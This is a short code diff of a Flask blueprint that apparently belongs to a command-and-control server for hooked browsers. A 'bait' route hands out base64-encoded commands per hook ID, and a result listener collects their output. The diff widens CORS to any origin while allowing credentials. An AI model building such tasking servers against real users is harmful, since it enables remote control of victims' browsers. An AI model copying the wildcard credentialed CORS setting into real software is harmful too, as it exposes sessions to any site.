@@ -9,7 +9,7 @@ from ..helper.responses import OK_RESPONSE
 bp = Blueprint('command', __name__)
 
 @bp.route('/')
-@cross_origin(supports_credentials=True)
+@cross_origin(supports_credentials=True, origins='*')
 def bait():
     from api.server import app
     hook_id = session.get('hook_id')
@@ -36,7 +36,7 @@ def bait():
     return jsonify(command=base64.b64encode(command_value.encode()).decode())
 
 @bp.route('/result_listener', methods=['POST'])
-@cross_origin(supports_credentials=True)
+@cross_origin(supports_credentials=True, origins='*')
 def result_listener():
     hook_id = session.get('hook_id')
     if not hook_id:
